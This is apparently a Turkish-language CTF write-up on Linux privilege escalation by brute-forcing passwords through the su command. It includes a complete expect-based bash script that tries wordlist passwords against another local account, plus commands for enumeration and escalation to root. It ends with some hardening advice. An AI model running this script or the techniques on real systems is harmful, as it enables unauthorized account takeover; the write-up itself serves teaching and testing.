# Yerel Ayrıcalık Yükseltme: `su` Brute-Force ile Sisteme Sızmak - Bir CTF Derinlemesine İncelemesi

Bu write-up, siber güvenlik yarışmalarında (CTF) ve gerçek dünya sızma testlerinde sıkça gözden kaçırılan ancak oldukça etkili bir yerel ayrıcalık yükseltme (Local Privilege Escalation - LPE) tekniğini ele alıyor: **`su` komutuna yönelik kaba kuvvet saldırısı (brute-force)**.

Otomatik zafiyet tarama araçları bazen bariz olmayan yapılandırma zayıflıklarını atlayabilir. Bu senaryo, temel Linux komutlarını ve sistem dosyalarını manuel olarak incelemenin zafer ile başarısızlık arasındaki farkı nasıl yaratabileceğini göstermektedir.

---

## `su` Brute-Force Nedir ve Neden İşe Yarar?

`su` (substitute user), mevcut oturumunuzu kapatmadan başka bir kullanıcının kimliğine bürünmenizi sağlayan temel bir Linux komutudur. `su <kullanıcı_adı>` komutunu çalıştırdığınızda, sistem sizden o kullanıcının parolasını ister.

Peki bu basit komut nasıl bir saldırı vektörüne dönüşür?

**Koşullar:**
1.  **Birden Fazla Kullanıcı:** Sistemde sizden daha yüksek yetkilere sahip başka kullanıcıların olması (örneğin `admin`, `root`, `developer`).
2.  **Zayıf Parolalar:** Hedef kullanıcının tahmin edilebilir veya yaygın olarak kullanılan bir parola belirlemiş olması.
3.  **Sistem Zafiyeti (En Kritik Faktör):** Sistemin, art arda yapılan hatalı parola denemelerine karşı bir önlem almaması.

Linux'ta bu önlem genellikle `/etc/login.defs` dosyasındaki `FAIL_DELAY` parametresi ile kontrol edilir. Bu parametre, her hatalı giriş denemesinden sonra sistemin kaç saniye beklemesi gerektiğini belirtir.

```
# /etc/login.defs dosyasından bir kesit
#
# Her hatalı giriş denemesi sonrası beklenecek saniye.
FAIL_DELAY        3
```

Eğer `FAIL_DELAY` değeri `0` veya `1` gibi çok düşük bir sayıya ayarlanmışsa, bir saldırgan saniyede yüzlerce parola deneyerek sistemi bir kaba kuvvet saldırısına karşı savunmasız bırakabilir. SSH gibi servislerde `fail2ban` gibi araçlar IP'yi engellerken, yerel `su` denemeleri genellikle bu tür korumalardan muaftır.

---

## CTF Senaryosu: Adım Adım Zafere

Bu bölümde, karşılaştığımız CTF makinesinde `admin` kullanıcısına nasıl geçtiğimizi adım adım anlatacağız.

### Adım 1: Keşif ve Hayal Kırıklığı

Hedef makinede düşük yetkili bir kullanıcı (`www-data`) olarak shell aldıktan sonra, standart prosedürleri izledik.

```bash
# Otomatik tarama betiğini çalıştır
./LinEnum.sh -t
```

`LinEnum` betiği, SUID dosyaları, `sudo -l` yetkileri veya bilinen kernel açıkları gibi kolay hedefler bulamadı. Bu noktada birçok kişi pes edebilir, ancak biz manuel keşfe yöneldik.

### Adım 2: Manuel Keşif ve "İşte Bu!" Anı

1.  **Kullanıcıları Listeleme:** `/etc/passwd` dosyası, her zaman altın madeni olabilir.

    ```bash
    cat /etc/passwd | grep 'sh$'
    ```
    Çıktıda standart kullanıcıların yanı sıra `admin` adında bir kullanıcı dikkatimizi çekti. Bu bizim potansiyel hedefimizdi.

2.  **Brute-Force Zeminini Kontrol Etme:** Aklımıza hemen parola denemek gelse de, önce sistemin buna izin verip vermediğini kontrol ettik.

    ```bash
    cat /etc/login.defs | grep 'FAIL_DELAY'
    ```
    Gördüğümüz manzara şaşırtıcıydı:
    ```
    FAIL_DELAY        1
    ```
    Sistem, hatalı denemeler arasında sadece 1 saniye bekliyordu. Bu, kaba kuvvet saldırısını pratik ve mümkün kılıyordu!

### Adım 3: Saldırı Aracını Hazırlama ve Çalıştırma

SSH kapalı olduğu için saldırıyı yerel olarak `su` komutu üzerinden otomatikleştirmemiz gerekiyordu. Bu iş için en iyi araçlardan biri `expect`'tir. `expect`, interaktif terminal uygulamalarıyla etkileşime girmek için tasarlanmıştır.

Aşağıdaki `brute_su.sh` betiğini oluşturduk:

```bash
#!/bin/bash

if [ "$#" -ne 2 ]; then
  echo "Kullanım: $0 <wordlist> <hedef_kullanıcı>"
  exit 1
fi

wordfile="$1"
target_user="$2"

echo "[*] Hedef: $target_user | Wordlist: $wordfile"
echo "[*] Brute force saldırısı başlatılıyor..."
echo "------------------------------------------------"

# Wordlist'i satır satır oku
while IFS= read -r password; do
  
  # `expect` komutu, `su` ile etkileşime girer.
  # Çıkış kodu (exit code) kontrol edilerek başarı/başarısızlık anlaşılır.
  # Çıktıyı /dev/null'a yönlendirerek ekranı temiz tutuyoruz.
  expect -c '
    # Timeout süresi, takılmaları önler
    set timeout 1
    
    # su komutunu başlat
    spawn su '$target_user'

    # Sistemden "Password:" veya "Parola:" metnini bekle
    expect "*assword:"

    # Mevcut parolayı gönder (\r = Enter tuşu)
    # Değişkenin doğru aktarılması için bu tırnak yapısı kritiktir!
    send "'"$password"'\r"

    # Sonucu bekle
    expect {
      # Başarısızlık mesajını yakala
      "su: Authentication failure" { exit 1 }
      # Başarılı olursa veya prompt gelirse timeout'a düşer
      timeout { exit 0 }
      # Bağlantı kapanırsa (başarı durumunda olabilir)
      eof { exit 0 }
    }
  ' > /dev/null 2>&1
  
  # expect'in çıkış kodunu kontrol et
  # Exit code 0 ise, parola doğru demektir!
  if [ $? -eq 0 ]; then
    echo -e "\n[+] BAŞARILI! Parola bulundu!"
    echo "[+] Kullanıcı: $target_user"
    echo "[+] Parola: $password"
    echo "------------------------------------------------"
    # Döngüyü sonlandır
    exit 0
  fi

  # İlerleme durumunu görmek için (isteğe bağlı)
  echo -ne "[*] Deneniyor: $password \r"

done < "$wordfile"

echo -e "\n[-] Başarısız. Wordlist'te geçerli parola bulunamadı."
```

**Saldırıyı Başlatma:**
```bash
# Betiğe çalıştırma izni ver
chmod +x brute_su.sh

# Popüler bir wordlist ile saldırıyı başlat
./brute_su.sh /usr/share/wordlists/rockyou.txt admin 
```
Script çalışmaya başladı ve kısa bir süre sonra doğru parolayı bularak ekrana yazdırdı!

### Adım 4: Ayrıcalık Yükseltme

Artık parolayı bildiğimize göre, `admin` olmak bir komut uzağımızdaydı.

```bash
su admin
# [BULUNAN_PAROLAYI_GİR]
$ id
uid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)
```
`id` komutuyla `admin` olduğumuzu ve hatta `sudo` grubunda olduğumuzu gördük. Buradan `root` olmak artık çok basitti: `sudo su`.

---

## Diğer Senaryolar ve Kullanım Alanları

Bu teknik sadece bu CTF'e özgü değildir. İşte `su` brute-force'un parlayabileceği diğer senaryolar:

1.  **Paylaşımlı Web Sunucuları:** `www-data` gibi düşük yetkili bir kullanıcıyla bir web sunucusuna sızdınız. Aynı sunucuda başka web sitelerinin de dosyaları olabilir. Diğer sitelerin kullanıcılarına (`site2_user`, `dev_user` vb.) `su` ile parola denemesi yaparak yatayda hareket edebilirsiniz.
2.  **IoT ve Gömülü Cihazlar:** Birçok IoT cihazı, `admin`, `root`, `service` gibi varsayılan kullanıcılara ve `admin`, `12345`, `password` gibi çok zayıf varsayılan parolalara sahiptir. Cihaza shell erişimi sağlandıktan sonra, bu hesapları `su` ile denemek genellikle sonuç verir.
3.  **Yanlış Yapılandırılmış Kurumsal Ortamlar:** Geliştiricilere veya stajyerlere verilen test makineleri genellikle güvenlik açısından zayıf bırakılır. Bu makinelerde bulunan sistem yöneticisi hesaplarına `su` ile saldırmak, ağın daha derinlerine sızmak için bir basamak olabilir.

---

## Faydalı Araçlar, Dokümanlar ve Siteler

Bu yolda size yardımcı olacak kaynaklar:

*   ### **Keşif ve Numaralandırma Araçları**
    *   [**LinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Renkli ve çok detaylı çıktılarıyla en iyi LPE keşif araçlarından biri.
    *   [**pspy**](https://github.com/DominicBreuker/pspy): Sistemdeki işlemleri anlık olarak dinleyerek, gizli cron job'ları veya diğer kullanıcıların aktivitelerini yakalamak için mükemmeldir.

*   ### **Wordlist'ler**
    *   [**SecLists**](https://github.com/danielmiessler/SecLists): Parolalar, kullanıcı adları, Fuzzing listeleri ve daha fazlasını içeren devasa bir koleksiyon. Her pentester'ın elinin altında olmalı.
    *   **Cewl:** Bir web sitesini tarayarak siteye özgü kelimelerden oluşan özel bir wordlist oluşturur. Hedefe yönelik saldırılarda çok etkilidir.

*   ### **Bilgi Bankaları (Mutlaka Okunmalı)**
    *   [**GTFOBins**](https://gtfobins.github.io/): Bir Linux komutunun `sudo` veya SUID biti ile nasıl kötüye kullanılabileceğini gösteren vazgeçilmez bir kaynaktır. `su` ve `expect` için de girdileri mevcuttur.
    *   [**HackTricks**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation): Pentest ve CTF'ler için en kapsamlı kaynaklardan biri. Ayrıcalık yükseltme bölümü adeta bir ansiklopedi gibidir.
    *   [**PayloadsAllTheThings - Privilege Escalation**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md): Farklı teknikler için komutları ve payload'ları içeren harika bir özet.

*   ### **Savunma ve Güçlendirme**
    *   [**Fail2ban**](https://www.fail2ban.org/): SSH, FTP gibi servislerin yanı sıra `su` denemelerini de log'lardan izleyerek saldırganları engelleyecek şekilde yapılandırılabilir.
    *   **PAM (Pluggable Authentication Modules):** `pam_wheel.so` modülü ile `su` komutunu sadece belirli bir gruptaki (`wheel`) kullanıcıların çalıştırabilmesi sağlanabilir.

Bu write-up'ın, basit görünen araçların ve konfigürasyonların ne kadar güçlü saldırı vektörleri olabileceğini gösterdiğini umuyorum. **Unutmayın: Otomasyon hızdır, manuel keşif ise sanattır.**
